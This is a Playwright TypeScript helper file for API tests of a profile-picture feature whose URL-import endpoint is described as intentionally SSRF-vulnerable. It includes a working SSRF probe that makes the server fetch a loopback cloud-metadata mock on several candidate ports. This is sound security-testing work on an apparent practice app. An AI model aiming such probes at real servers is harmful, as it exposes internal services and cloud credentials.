import type { APIRequestContext, APIResponse } from '@playwright/test';

/**
 * Profile Picture Helpers
 *
 * Supports API tests for the profile picture surfaces:
 * - `/upload_profile_picture`      (multipart file upload)
 * - `/upload_profile_picture_url`  (server-side fetch by URL, intentionally SSRF-vulnerable)
 */

// 1x1 transparent PNG, used as a minimal valid upload payload.
export const TEST_PNG_BUFFER = Buffer.from(
	'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
	'base64'
);

export async function uploadProfilePicture(
	api: APIRequestContext,
	token: string,
	options?: { filename?: string; mimeType?: string; buffer?: Buffer }
): Promise<APIResponse> {
	return api.post('/upload_profile_picture', {
		headers: { Authorization: `Bearer ${token}` },
		multipart: {
			profile_picture: {
				name: options?.filename ?? 'avatar.png',
				mimeType: options?.mimeType ?? 'image/png',
				buffer: options?.buffer ?? TEST_PNG_BUFFER
			}
		}
	});
}

export async function importProfilePictureFromUrl(
	api: APIRequestContext,
	token: string,
	imageUrl: string
): Promise<APIResponse> {
	return api.post('/upload_profile_picture_url', {
		headers: { Authorization: `Bearer ${token}` },
		data: { image_url: imageUrl }
	});
}

/**
 * SSRF probe target: the app exposes a loopback-only cloud-metadata mock
 * (`/latest/meta-data/instance-id`) that returns a fixed, known-length body
 * and rejects requests that do not originate from the app's own host. If the
 * profile-picture URL importer can be made to reach it, that proves the
 * server-side fetch trusts attacker-supplied URLs into internal network space.
 */
const SSRF_METADATA_PATH = '/latest/meta-data/instance-id';
const SSRF_EXPECTED_CONTENT_LENGTH = 18; // "i-0demo1234567890\n"

function candidateInternalPorts(baseURL: string): string[] {
	const envPort = process.env.SSRF_INTERNAL_PORT?.trim();
	const basePort = new URL(baseURL).port;
	return [...new Set([envPort, '5000', basePort].filter((p): p is string => !!p))];
}

export type SsrfProbeResult = {
	attempted: string[];
	succeeded: boolean;
	matchedUrl: string | null;
	response: Record<string, any> | null;
};

/**
 * Attempt to make the server fetch its own loopback-only metadata endpoint
 * through the URL-import feature. Tries each candidate internal port until one
 * yields the expected fixed-length body, confirming the SSRF actually reached
 * the intended internal resource (not just any 200 response).
 */
export async function attemptSsrfViaProfileUrlImport(
	api: APIRequestContext,
	token: string,
	baseURL: string
): Promise<SsrfProbeResult> {
	const attempted: string[] = [];

	for (const port of candidateInternalPorts(baseURL)) {
		const targetUrl = `http://127.0.0.1:${port}${SSRF_METADATA_PATH}`;
		attempted.push(targetUrl);

		const res = await importProfilePictureFromUrl(api, token, targetUrl);
		const body = await res.json().catch(() => null);

		if (
			body?.status === 'success' &&
			body?.debug_info?.http_status === 200 &&
			body?.debug_info?.content_length === SSRF_EXPECTED_CONTENT_LENGTH
		) {
			return { attempted, succeeded: true, matchedUrl: targetUrl, response: body };
		}
	}

	return { attempted, succeeded: false, matchedUrl: null, response: null };
}
